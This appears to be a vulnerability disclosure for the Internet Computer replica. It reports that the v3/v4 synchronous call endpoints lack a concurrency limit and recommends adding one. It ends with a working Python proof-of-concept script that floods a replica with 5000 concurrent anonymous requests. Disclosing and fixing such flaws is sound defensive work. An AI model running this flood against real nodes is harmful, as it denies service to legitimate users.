### Title
Missing Concurrency Limit on Synchronous Call Endpoints (`/api/v3`, `/api/v4`) Allows Resource Exhaustion - (File: `rs/http_endpoints/public/src/lib.rs`)

---

### Summary

The Internet Computer replica's HTTP public endpoint applies a `GlobalConcurrencyLimitLayer` to most API routes, but explicitly omits it for the synchronous call endpoints `/api/v3/canister/{id}/call`, `/api/v4/canister/{id}/call`, and `/api/v4/subnet/{id}/call`. These endpoints hold connections open for up to 10 seconds per request while polling for ingress certification. An unprivileged attacker can flood these endpoints with concurrent requests, exhausting the replica's Tokio runtime and connection resources, degrading or denying service to legitimate users.

---

### Finding Description

In `make_router` inside `rs/http_endpoints/public/src/lib.rs`, every endpoint receives a `GlobalConcurrencyLimitLayer` except the three synchronous call routers:

```rust
// TODO(CON-1574): see if there is any reasonable explicit concurrency limit we could use here.
.merge(http_handler.call_v3_router)
.merge(http_handler.call_v4_router)
.merge(http_handler.subnet_call_v4_router)
``` [1](#0-0) 

By contrast, the v2 call endpoint is protected:

```rust
.merge(http_handler.call_v2_router.layer(service_builder(
    GlobalConcurrencyLimitLayer::new(config.max_call_concurrent_requests),
)))
``` [2](#0-1) 

The default value of `max_call_concurrent_requests` is 50, meaning v2 sheds load after 50 concurrent requests, while v3/v4 have no such ceiling. [3](#0-2) 

The synchronous call handler (`call_sync`) holds each connection open while waiting for the ingress message to be certified, with a configurable timeout of `ingress_message_certificate_timeout_seconds` (default: 10 seconds): [4](#0-3) 

The `IngressWatcher` subscription channel is bounded at 1000 entries, but this only limits subscription registration, not the number of open HTTP connections holding Tokio tasks alive: [5](#0-4) 

The ingress pool throttler (`IngressPoolThrottler::exceeds_threshold`) provides a secondary guard that returns `503` when the pool is full, but it only fires after the pool fills and does not bound the number of concurrent long-lived HTTP connections: [6](#0-5) 

The boundary node (`ic_boundary`) has optional per-IP and per-subnet rate limiting for call routes, but these are `Option<u32>` fields that may not be configured in all deployments: [7](#0-6) 

---

### Impact Explanation

An unprivileged attacker sending a sustained flood of valid CBOR-encoded POST requests to `/api/v3/canister/{canister_id}/call` or `/api/v4/canister/{canister_id}/call` can hold an unbounded number of Tokio async tasks open simultaneously, each waiting up to 10 seconds for certification. This exhausts the replica node's async runtime capacity and TCP connection resources, causing:

- Degraded response times for all other endpoints on the same replica node.
- Legitimate users' query, read_state, and v2 call requests being delayed or dropped.
- The replica node potentially becoming unresponsive to the rest of the subnet's P2P traffic if OS-level resource limits are hit.

The impact is scoped to a single replica node (not subnet-wide consensus), but since boundary nodes route to specific replicas, a targeted attack can effectively deny service to users routed through that node.

---

### Likelihood Explanation

The attack requires only the ability to send valid HTTP POST requests with well-formed CBOR bodies to a publicly reachable replica endpoint. No authentication, cycles, or special privileges are needed — the `AnonymousIdentity` sender is accepted. The TODO comment in the source code (`TODO(CON-1574)`) explicitly acknowledges the missing limit as an open issue, confirming the gap is known and unresolved. The attack is trivially automatable with any HTTP client capable of concurrent requests. [8](#0-7) 

---

### Recommendation

Apply a `GlobalConcurrencyLimitLayer` to `call_v3_router`, `call_v4_router`, and `subnet_call_v4_router` in `make_router`, using a dedicated config field (e.g., `max_sync_call_concurrent_requests`) analogous to `max_call_concurrent_requests`. The synchronous nature of these endpoints (long-held connections) makes a concurrency cap more important here than for the fire-and-forget v2 endpoint. Additionally, ensure boundary node rate limiting (`rate_limit_per_second_per_ip`, `rate_limit_per_second_per_subnet`) is enforced by default rather than being opt-in.

---

### Proof of Concept

```python
import asyncio, aiohttp, cbor2

# Minimal anonymous CBOR ingress envelope targeting any canister
body = cbor2.dumps({
    "content": {
        "request_type": "call",
        "canister_id": bytes(29),   # management canister
        "method_name": "raw_rand",
        "arg": b"DIDL\x00\x00",
        "sender": b"\x04",          # anonymous
        "ingress_expiry": 2**63,
        "nonce": b"\x00" * 32,
    }
})

REPLICA = "http://<replica-ip>:8080"
TARGET  = f"{REPLICA}/api/v3/canister/aaaaa-aa/call"

async def flood():
    async with aiohttp.ClientSession() as s:
        tasks = [
            s.post(TARGET, data=body,
                   headers={"Content-Type": "application/cbor"},
                   timeout=aiohttp.ClientTimeout(total=15))
            for _ in range(5000)   # 5000 concurrent long-held connections
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

asyncio.run(flood())
```

Each of the 5000 concurrent requests passes ingress validation and enters the `call_sync` handler, which holds the connection open for up to 10 seconds awaiting certification. Because no `GlobalConcurrencyLimitLayer` is applied to `call_v3_router`, none of these requests are shed. The replica's Tokio runtime is saturated, and legitimate requests to all endpoints on that node experience severe latency or timeout.
